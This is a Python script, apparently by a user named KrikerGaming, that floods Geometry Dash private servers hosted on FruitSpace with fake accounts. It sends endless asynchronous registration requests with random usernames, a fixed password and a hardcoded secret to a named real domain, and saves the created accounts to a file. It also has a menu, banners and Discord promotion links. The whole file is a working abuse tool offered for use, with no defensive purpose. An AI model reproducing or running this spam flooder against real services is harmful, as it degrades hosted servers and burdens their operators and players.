# Сделал KrikerGaming специально для спама хостингов Фруит спэйс или других хостов
# Импорты
import argparse
import requests
import os
import asyncio
import aiohttp
import random
import string
# Переменные
pref_plus = '[ + ] '
pref_minus = '[ - ] '
pref_vopros = '[ ? ] '
pref_vosk = '[ ! ] '
hello = '''
██╗  ██╗███████╗██╗     ██╗      ██████╗ 
██║  ██║██╔════╝██║     ██║     ██╔═══██╗
███████║█████╗  ██║     ██║     ██║   ██║
██╔══██║██╔══╝  ██║     ██║     ██║   ██║
██║  ██║███████╗███████╗███████╗╚██████╔╝
╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝ ╚═════╝ 
'''
spam = '''
███████╗██████╗  █████╗ ███╗   ███╗     ██████╗ ██████╗ ██████╗ ███████╗     ██╗██╗  ██╗██╗  ██╗██╗ 
██╔════╝██╔══██╗██╔══██╗████╗ ████║    ██╔════╝ ██╔══██╗██╔══██╗██╔════╝    ██╔╝██║  ██║██║  ██║╚██╗
███████╗██████╔╝███████║██╔████╔██║    ██║  ███╗██║  ██║██████╔╝███████╗    ██║ ███████║███████║ ██║
╚════██║██╔═══╝ ██╔══██║██║╚██╔╝██║    ██║   ██║██║  ██║██╔═══╝ ╚════██║    ██║ ██╔══██║██╔══██║ ██║
███████║██║     ██║  ██║██║ ╚═╝ ██║    ╚██████╔╝██████╔╝██║     ███████║    ╚██╗██║  ██║██║  ██║██╔╝
╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝     ╚═════╝ ╚═════╝ ╚═╝     ╚══════╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝ 
                                                                                                    
'''
database = ""

# Функции
def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')
def check():
    with open("accounts.txt", "r") as f:
        for line in f:
            if ":" in line:
                username, password = line.strip().split(":")
                print("Username:", username)
                print("Password:", password)
                print("")
def spam_fruitSpace():
    clear_console()
    print(spam)
    database_one = input(pref_vopros + "Enter the ID: ")
    database_two = 'http://rugd.gofruit.space/' + database_one + '/db/'
    asyncio.run(spam_fruitSpace_1(database_two))
async def spam_fruitSpace_1(database_two):
    while True:
        Letters = string.ascii_lowercase
        Email = ''.join(random.choice(Letters) for i in range(12))
        RandomString = str(random.randint(1, 9999999))
        UserName = RandomString
        password = "123456"
        userNameGDPS = UserName
        data = {
            'userName': UserName,
            'password': password,
            'email': RandomString + "m" + "@" + "gmail.com",
            'secret': "Wmfv3899gc9"
        }
        headers = {'User-Agent': '', 'Content-Type': 'application/x-www-form-urlencoded'}
        async with aiohttp.ClientSession() as session:
            RequestRegister = await session.post(database_two + "accounts/registerGJAccount.php",
                                                 data=data, headers=headers)
            Info1 = "The account was successfully registered with the name " + UserName
            f = open("accounts.txt", "a")
            f.write(f"{userNameGDPS}:{password}\n")
            f.close()
            print(pref_plus + Info1)
def spam_by_reference():
    clear_console()
    print(spam)
    database_fri = input(pref_vopros + "Enter ref (https://gofruit.space/gdps/01PI): ")
    asyncio.run(spam_by_reference_1(database_fri))
async def spam_by_reference_1(database_fri):
    while True:
        Letters = string.ascii_lowercase
        Email = ''.join(random.choice(Letters) for i in range(12))
        RandomString = str(random.randint(1, 9999999))
        UserName = RandomString
        password = "123456"
        userNameGDPS = UserName
        data = {
            'userName': UserName,
            'password': password,
            'email': RandomString + "m" + "@" + "gmail.com",
            'secret': "Wmfv3899gc9"
        }
        headers = {'User-Agent': '', 'Content-Type': 'application/x-www-form-urlencoded'}
        async with aiohttp.ClientSession() as session:
            RequestRegister = await session.post(database_fri + "/accounts/registerGJAccount.php",
                                                 data=data, headers=headers)
            Info1 = "The account was successfully registered with the name " + UserName
            f = open("accounts.txt", "a")
            f.write(f"{userNameGDPS}:{password}\n")
            f.close()
            print(pref_plus + Info1)
def help_spam():
    clear_console()
    print(spam)
    print("[ 1 ] Spam GDPS Hosting (FruitSpace)")
    print("[ 2 ] Spam GDPS by reference")
    print("")
    choice_help = input(pref_vopros + "Choose 1 or 2: ")

    if choice_help == "1":
        while True:
            asyncio.run(spam_fruitSpace())
    elif choice_help == "2":
        spam_by_reference()
    else:
        print(pref_vosk + "Wrong choice.")
        time.sleep(1)
        clear_console()
        help_spam()
def dis():
    print(spam)
    print(pref_vosk + "Discord F-HOST: https://discord.gg/2Wej38xU7r")
    print(pref_vosk + "Discord FLPS Forever: https://discord.gg/44egtXYkev")
    print(pref_vosk + "Site F-HOST: https://f-host.xyz/")
    print(pref_vosk + "Site FLPS: https://site.flpsprivateserver.xyz/")

def spam_tools():
    print(spam)
    print("[ 1 ] Spam GDPS Hosting (accounts)")
    print("[ 2 ] Check spam Acc")
    print("[ 3 ] Social network")
    print("")
    choice = input(pref_vopros + "Choose 1, 2 or 3: ")

    if choice == "1":
        help_spam()
    elif choice == "2":
        check()
    elif choice == "3":
        dis()
    else:
        print(pref_vosk + "Wrong choice.")
        time.sleep(1)
        clear_console()
        spam_tools()

    # Начало
clear_console()
print(hello)

yes_or_no = input(pref_vosk + "Hey, buddy! Ready to use the function Spam GDPS. (Yes/No) ")

if yes_or_no == 'y' or yes_or_no == 'yes':
    clear_console()
    spam_tools()
else:
    clear_console()
    print("bye")
    exit()

